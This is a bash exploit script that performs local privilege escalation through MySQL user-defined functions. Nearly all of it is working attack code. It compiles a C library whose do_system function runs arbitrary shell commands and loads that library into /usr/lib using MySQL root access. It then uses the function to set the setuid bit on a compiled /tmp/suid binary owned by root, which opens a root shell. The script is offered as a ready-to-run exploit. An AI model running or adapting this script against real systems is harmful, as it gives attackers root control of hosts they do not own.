#!/bin/bash
# mysql_udf exploit with 1 hit
# @404death
# Exploit-db : https://www.exploit-db.com/exploits/1518

cat <<EOF > xailay_udf2.c
#include <stdio.h>
#include <stdlib.h>

enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};

typedef struct st_udf_args {
	unsigned int		arg_count;	// number of arguments
	enum Item_result	*arg_type;	// pointer to item_result
	char 			**args;		// pointer to arguments
	unsigned long		*lengths;	// length of string args
	char			*maybe_null;	// 1 for maybe_null args
} UDF_ARGS;

typedef struct st_udf_init {
	char			maybe_null;	// 1 if func can return NULL
	unsigned int		decimals;	// for real functions
	unsigned long 		max_length;	// for string functions
	char			*ptr;		// free ptr for func data
	char			const_item;	// 0 if result is constant
} UDF_INIT;

int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
{
	if (args->arg_count != 1)
		return(0);

	system(args->args[0]);

	return(0);
}

char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
{
	return(0);
}
EOF
gcc -g -c xailay_udf2.c

gcc -g -shared -Wl,-soname,xailay_udf2.so -o xailay_udf2.so xailay_udf2.o -lc

cat <<EOF > suid.c
int main(void){
  setresuid(0, 0, 0);
  system("/bin/bash");
}
EOF
gcc suid.c -o /tmp/suid
cat <<EOF > priv.sql
use mysql;
create table sxai(line blob);
insert into sxai values(load_file('/home/j0hn/xailay_udf2.so'));
select * from sxai into dumpfile '/usr/lib/xailay_udf2.so';
create function do_system returns integer soname 'xailay_udf2.so';
#select * from mysql.func;
EOF
mysql -u root < priv.sql >/dev/null 2>&1 # mysql -u root -p password123 < priv.sql
echo "[+] pwned !!!"
cat <<EOF > suid.sql
#select do_system('gcc /home/j0hn/suid.c -o /tmp/suid');
select do_system('chown root:root /tmp/suid && chmod u+s /tmp/suid');
EOF
mysql -u root < suid.sql >/dev/null 2>&1  #for pass : mysql -u root -p password123 < suid.sql
echo "[+] uid(0) !!!"
/tmp/suid

